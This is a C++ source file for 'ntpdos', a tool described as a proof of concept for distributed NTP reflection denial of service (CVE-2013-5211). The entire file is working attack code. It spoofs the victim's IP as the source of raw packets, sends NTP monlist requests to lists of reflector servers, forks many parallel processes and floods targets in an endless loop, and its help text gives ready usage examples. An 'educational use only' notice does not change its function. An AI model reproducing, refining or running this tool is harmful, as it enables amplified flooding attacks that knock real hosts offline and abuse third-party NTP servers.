/*******************************************************************************
 * ntpdos.cpp - NTP distributed reflection DoS                                 *
 *                                                                             *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * ntpdos - PoC for distributed NTP reflection DoS (CVE-2013-5211).            *
 *                                                                             *
 *                                                                             *
 * AUTHOR                                                                      *
 * sepehrdad                                                                   *
 *                                                                             *
 *                                                                             *
 * LICENSE                                                                     *
 * This software is distributed under the GNU General Public License version 3 *
 *                                                                             *
 *                                                                             *
 * LEGAL NOTICE                                                                *
 * THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY    *
 * ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.        *
 * BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.                          *
 *                                                                             *
 ******************************************************************************/

#include <arpa/inet.h>
#include <fstream>
#include <getopt.h>
#include <iostream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#define VERSION "v0.1"
#define ERR(str) std::cerr << "[-] ERROR: " << str << '\n'

#define NTP_PORT 123
#define PKT_LEN 104

struct ntp_req_t {
  unsigned char rm_vn_mode;     /* response, more, version, mode */
  unsigned char auth_seq;       /* key, sequence number */
  unsigned char implementation; /* implementation number */
  unsigned char request;        /* request number */
  unsigned short err_nitems;    /* error code/number of data items */
  unsigned short mbz_itemsize;  /* item size */
  char data[40];                /* data area [32 prev](176 byte max) */
  unsigned long tstamp;         /* time stamp, for authentication */
  unsigned int keyid;           /* encryption key */
  char mac[8];                  /* (optional) 8 byte auth code */
};

struct SOCK {
  int fd;
  sockaddr_in dst;
};

unsigned short csum(unsigned short *addr, int len) {
  unsigned long sum;
  for (sum = 0; len > 0; len--)
    sum += *addr++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return static_cast<unsigned short>(~sum);
}

void build_pkt(char *pkt, const char *src, const char *dst) {
  iphdr *ip{reinterpret_cast<iphdr *>(pkt)};
  udphdr *udp{reinterpret_cast<udphdr *>(pkt + sizeof(iphdr))};
  ntp_req_t *ntp{
      reinterpret_cast<ntp_req_t *>(pkt + sizeof(iphdr) + sizeof(udphdr))};
  ip->version = 4;
  ip->ihl = 5;
  ip->tos = 0;
  ip->tot_len = PKT_LEN;
  ip->id = htons(rand());
  ip->frag_off = 0;
  ip->ttl = 255;
  ip->protocol = IPPROTO_UDP;
  ip->check = 0;
  ip->saddr = inet_addr(src);
  ip->daddr = inet_addr(dst);

  udp->source = htons(rand());
  udp->dest = htons(NTP_PORT);
  udp->len = htons(sizeof(udphdr) + sizeof(ntp_req_t));
  udp->check = 0;

  ip->check = csum(reinterpret_cast<unsigned short *>(pkt), PKT_LEN);

  ntp->rm_vn_mode = 0x27;
  ntp->implementation = 0x03;
  ntp->request = 0x2a;
}

SOCK make_socket(const char *dst) {
  SOCK sock;
  int on = 1;
  sock.dst.sin_family = AF_INET;
  sock.dst.sin_port = htons(NTP_PORT);
  sock.dst.sin_addr.s_addr = inet_addr(dst);

  if ((sock.fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
    perror("[-] Error ");
    exit(EXIT_FAILURE);
  }

  if (setsockopt(sock.fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    perror("[-] Error ");
    exit(EXIT_FAILURE);
  }

  return sock;
}

void send(SOCK *sock, char *pkt) {
  if (sendto(sock->fd, pkt, PKT_LEN, 0,
             reinterpret_cast<sockaddr *>(&sock->dst), sizeof(sock->dst)) < 0) {
    perror("[-] Error ");
    close(sock->fd);
    exit(EXIT_FAILURE);
  }
}

void version() { std::cout << "ntpdos " << VERSION << '\n'; }

void banner() { std::cout << "--==[ ntpdos by sepehrdad ]==--\n\n"; }

void help() {
  std::cout
      << "usage:\n\n"
      << "  ntpdos -t <addr> -s <addr> [options] | [misc]\n\n"
      << "options:\n\n"
      << "  -t <addr>    - target ip address\n"
      << "  -T <file>    - list of target ip addresses\n"
      << "  -s <addr>    - ntp server ip address\n"
      << "  -S <file>    - list of ntp server ip addresses\n"
      << "  -p <num>     - number of parallel processes (default: 80)\n"
      << "  -d <num>     - delay in microsecs (default: 1000)\n\n"
      << "misc:\n\n"
      << "  -V           - show version\n"
      << "  -H           - show help\n\n"
      << "example:\n\n"
      << "  # Attack 127.0.0.1 with servers from servers.lst\n"
      << "  $ ntpdos -t 127.0.0.1 -S servers.lst\n\n"
      << "  # Attack targets from targets.lst with 192.168.2.11 server\n"
      << "  $ ntpdos -T targets.lst -s 192.168.2.11\n\n"
      << "  # Attack targets from targets.lst with servers from servers.lst\n"
      << "  $ ntpdos -T targets.lst -S servers.lst\n\n"
      << "  # Attack 1.2.3.4 with 5.6.7.8 using 200 parallel processes\n"
      << "  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -p 200\n\n"
      << "  # Attack 1.2.3.4 with 5.6.7.8 with 1 microsec delay\n"
      << "  $ ntpdos -t 1.2.3.4 -s 5.6.7.8 -d 1\n\n"
      << "notes:\n\n"
      << "  * list of ip addresses should have 1 ip address per line\n\n";
}

void load_file(std::string filename, std::vector<std::string> &vec) {
  std::ifstream filestream(filename);

  if (filestream.good() && filestream.is_open()) {
    std::string line{};
    while (getline(filestream, line))
      vec.push_back(line);
    filestream.close();
  } else {
    ERR("Unable to open " + filename);
    exit(EXIT_FAILURE);
  }
}

void attack(const std::vector<std::string> targets,
            const std::vector<std::string> servers, int delay) {

  std::vector<SOCK> sockets{};

  for (auto &server : servers)
    sockets.push_back(make_socket(server.c_str()));

  while (true) {
    for (auto &target : targets) {
      for (std::size_t i = 0; i < servers.size(); ++i) {
        char pkt[PKT_LEN]{};
        build_pkt(pkt, target.c_str(), servers[i].c_str());
        send(&sockets[i], pkt);
      }
    }
    usleep(delay);
  }
}

int main(int argc, char *argv[]) {
  banner();

  if (argc < 2) {
    ERR("use -H for help");
    exit(EXIT_FAILURE);
  }

  int c{0}, processes{80}, delay{1000};
  std::vector<std::string> targets{}, servers{};

  while ((c = getopt(argc, argv, "VHp:d:s:S:t:T:")) != -1) {
    switch (c) {
    case 'p':
      processes = std::strtol(optarg, NULL, 10);
      if (processes <= 0) {
        ERR("processes number can't be negative");
        exit(EXIT_FAILURE);
      }
      break;
    case 'd':
      delay = std::strtol(optarg, NULL, 10);
      if (delay <= 0) {
        ERR("delay can't be less than 1");
        exit(EXIT_FAILURE);
      }
      break;
    case 't':
      targets.push_back(optarg);
      break;
    case 'T':
      load_file(optarg, targets);
      break;
    case 's':
      servers.push_back(optarg);
      break;
    case 'S':
      load_file(optarg, servers);
      break;
    case 'V':
      version();
      exit(EXIT_SUCCESS);
    case 'H':
      help();
      exit(EXIT_SUCCESS);
    default:
      exit(EXIT_FAILURE);
    }
  }

  if (!(targets.size() > 0)) {
    ERR("No target have been selected");
    exit(EXIT_FAILURE);
  }

  if (!(servers.size() > 0)) {
    ERR("No server have been selected");
    exit(EXIT_FAILURE);
  }

  for (int p = 0; p < processes; ++p) {
    if (fork())
      attack(targets, servers, delay);
  }

  std::cout << "Attacking " << targets.size() << " target/s with "
            << servers.size() << " server/s\n"
            << "Press CTRL+C to stop the attack\n";

  getc(stdin);

  return 0;
}
